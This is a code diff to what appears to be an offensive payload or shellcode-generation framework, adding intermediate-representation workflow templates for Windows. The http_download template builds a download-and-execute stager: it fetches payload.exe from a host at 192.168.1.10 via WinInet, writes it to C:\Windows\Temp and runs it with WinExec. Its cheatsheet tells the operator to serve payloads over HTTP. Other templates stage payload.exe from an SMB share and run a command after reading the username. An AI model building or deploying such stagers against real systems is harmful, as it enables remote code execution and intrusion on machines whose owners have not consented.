@@ -38,6 +38,7 @@ from .ir import (
     Immediate,
     Jump,
     NameRef,
+    StoreLocal,
     SuccessPredicate,
     Terminate,
     TerminateStyle,
@@ -182,6 +183,10 @@ class WorkflowTemplate(PayloadTemplate):
 
                 elif isinstance(op, AllocateStruct):
                     _add(op.struct_type)
+
+                elif isinstance(op, StoreLocal):
+                    _add(op.name)
+                    self._collect_value_refs(op.value, _add)
 
                 elif isinstance(op, Compare):
                     _add(op.value)
@@ -894,4 +899,381 @@ class IRCheckPathTemplate(WorkflowTemplate):
             ("Path checked", path),
             ("Exit code 0 if path exists", ""),
             ("Exit code 1 if path missing", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Move file workflow (standalone MoveFileA, no execution)
+# ---------------------------------------------------------------------------
+
+
+def build_move_file_workflow(
+    src_path: str = r"\\192.168.1.10\share\payload.exe",
+    dst_path: str = r"C:\Windows\Temp\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the move_file reference workflow.
+
+    MoveFileA(src, dst) -> exit
+
+    Moves (or renames) a file. No execution after the move.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_move_file",
+        blocks=(
+            Block("entry", (
+                ConstructString("src_path", src_path),
+                ConstructString("dst_path", dst_path),
+                CallAPI(
+                    "MoveFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dst_path"),
+                    ),
+                    result="move_ret",
+                ),
+                Compare(
+                    "move_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRMoveFileTemplate(WorkflowTemplate):
+    """IR-backed move_file template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_move_file_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_move_file_workflow(
+            src_path=config.src_path or r"\\192.168.1.10\share\payload.exe",
+            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Source path (moved, not copied)",
+             config.src_path or r"\\192.168.1.10\share\payload.exe"),
+            ("Destination path",
+             config.dst_path or r"C:\Windows\Temp\payload.exe"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Get username workflow
+# ---------------------------------------------------------------------------
+
+
+def build_get_username_workflow(
+    command: str = "whoami",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the get_username reference workflow.
+
+    LoadLibraryA("advapi32.dll") -> GetUserNameA(buf, &len) ->
+    WinExec(command) -> exit
+
+    Calls GetUserNameA to retrieve the current username into a
+    128-byte stack buffer, then executes a configurable command.
+    The username is available in the buffer for debug inspection.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_get_username",
+        blocks=(
+            Block("entry", (
+                ConstructString("advapi_dll", "advapi32.dll"),
+                ConstructString("cmd", command),
+
+                AllocateStruct("username_buf", "CHAR_BUFFER_128"),
+                AllocateLocal("username_len"),
+
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("advapi_dll"),),
+                    result="advapi_base",
+                ),
+
+                StoreLocal("username_len", Immediate(128)),
+
+                CallAPI(
+                    "GetUserNameA",
+                    arguments=(
+                        AddressOf("username_buf"),
+                        AddressOf("username_len"),
+                    ),
+                    result="getuser_ret",
+                ),
+                Compare(
+                    "getuser_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="run_command",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_command", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("cmd"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRGetUsernameTemplate(WorkflowTemplate):
+    """IR-backed get_username template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_get_username_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_get_username_workflow(
+            command=config.command or "whoami",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Retrieves current username via GetUserNameA", ""),
+            ("Command executed after", config.command or "whoami"),
+            ("Username buffer at", "username_buf (128 bytes on stack)"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# HTTP download workflow (WinInet)
+# ---------------------------------------------------------------------------
+
+
+def build_http_download_workflow(
+    url: str = "http://192.168.1.10/payload.exe",
+    dst_path: str = r"C:\Windows\Temp\payload.exe",
+    user_agent: str = "Mozilla/5.0",
+    alloc_size: int = 0x100000,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the http_download reference workflow.
+
+    InternetOpenA -> InternetOpenUrlA -> VirtualAlloc ->
+    InternetReadFile (loop until bytes_read==0) ->
+    InternetCloseHandle (url) -> InternetCloseHandle (session) ->
+    CreateFileA -> WriteFile -> CloseHandle -> WinExec(dst_path)
+
+    Downloads a file from an HTTP URL via WinInet and executes it.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_http_download",
+        blocks=(
+            Block("entry", (
+                ConstructString("user_agent", user_agent),
+                ConstructString("url", url),
+                ConstructString("dst_path", dst_path),
+
+                AllocateLocal("bytes_read"),
+                AllocateLocal("bytes_total"),
+
+                # InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)
+                CallAPI(
+                    "InternetOpenA",
+                    arguments=(
+                        AddressOf("user_agent"),
+                        Immediate(1),   # INTERNET_OPEN_TYPE_DIRECT
+                        Immediate(0),   # lpszProxy = NULL
+                        Immediate(0),   # lpszProxyBypass = NULL
+                        Immediate(0),   # dwFlags = 0
+                    ),
+                    result="inet_session",
+                ),
+                Compare(
+                    "inet_session",
+                    SuccessPredicate.NONZERO,
+                    true_block="open_url",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("open_url", (
+                # InternetOpenUrlA(session, url, NULL, 0, 0, 0)
+                CallAPI(
+                    "InternetOpenUrlA",
+                    arguments=(
+                        NameRef("inet_session"),
+                        AddressOf("url"),
+                        Immediate(0),   # lpszHeaders = NULL
+                        Immediate(0),   # dwHeadersLength = 0
+                        Immediate(0),   # dwFlags = 0
+                        Immediate(0),   # dwContext = 0
+                    ),
+                    result="inet_url",
+                ),
+                Compare(
+                    "inet_url",
+                    SuccessPredicate.NONZERO,
+                    true_block="alloc_buffer",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("alloc_buffer", (
+                # VirtualAlloc(NULL, alloc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),           # lpAddress = NULL
+                        Immediate(alloc_size),  # dwSize
+                        Immediate(0x3000),      # MEM_COMMIT | MEM_RESERVE
+                        Immediate(4),           # PAGE_READWRITE
+                    ),
+                    result="virt_buf",
+                ),
+                Compare(
+                    "virt_buf",
+                    SuccessPredicate.NONZERO,
+                    true_block="read_loop",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("read_loop", (
+                # Single read of up to alloc_size bytes
+                CallAPI(
+                    "InternetReadFile",
+                    arguments=(
+                        NameRef("inet_url"),
+                        NameRef("virt_buf"),
+                        Immediate(alloc_size),
+                        AddressOf("bytes_total"),
+                    ),
+                    result="read_ret",
+                ),
+                Compare(
+                    "bytes_total",
+                    SuccessPredicate.NONZERO,
+                    true_block="close_handles",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("close_handles", (
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_url"),),
+                ),
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_session"),),
+                ),
+                Jump("write_file"),
+            )),
+
+            Block("write_file", (
+                # CreateFileA(dst_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
+                CallAPI(
+                    "CreateFileA",
+                    arguments=(
+                        AddressOf("dst_path"),
+                        Immediate(0x40000000),  # GENERIC_WRITE
+                        Immediate(0),           # dwShareMode = 0
+                        Immediate(0),           # lpSecurityAttributes = NULL
+                        Immediate(2),           # CREATE_ALWAYS
+                        Immediate(0x80),        # FILE_ATTRIBUTE_NORMAL
+                        Immediate(0),           # hTemplateFile = NULL
+                    ),
+                    result="file_handle",
+                ),
+                Compare(
+                    "file_handle",
+                    SuccessPredicate.INVALID_HANDLE,
+                    true_block="do_write",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("do_write", (
+                # WriteFile(file_handle, virt_buf, bytes_total, &bytes_read, NULL)
+                CallAPI(
+                    "WriteFile",
+                    arguments=(
+                        NameRef("file_handle"),
+                        NameRef("virt_buf"),
+                        NameRef("bytes_total"),
+                        AddressOf("bytes_read"),
+                        Immediate(0),           # lpOverlapped = NULL
+                    ),
+                ),
+                CallAPI(
+                    "CloseHandle",
+                    arguments=(NameRef("file_handle"),),
+                ),
+                Jump("exec_payload"),
+            )),
+
+            Block("exec_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRHttpDownloadTemplate(WorkflowTemplate):
+    """IR-backed http_download template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_http_download_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_http_download_workflow(
+            url=config.url or "http://192.168.1.10/payload.exe",
+            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
+            alloc_size=config.alloc_size or 0x100000,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url = config.url or "http://192.168.1.10/payload.exe"
+        dst = config.dst_path or r"C:\Windows\Temp\payload.exe"
+        return [
+            ("Start HTTP server", f"python3 -m http.server 80 --directory /path/to/payloads"),
+            ("Download URL", url),
+            ("Writes to", dst),
+            ("Executes after download", dst),
         ]
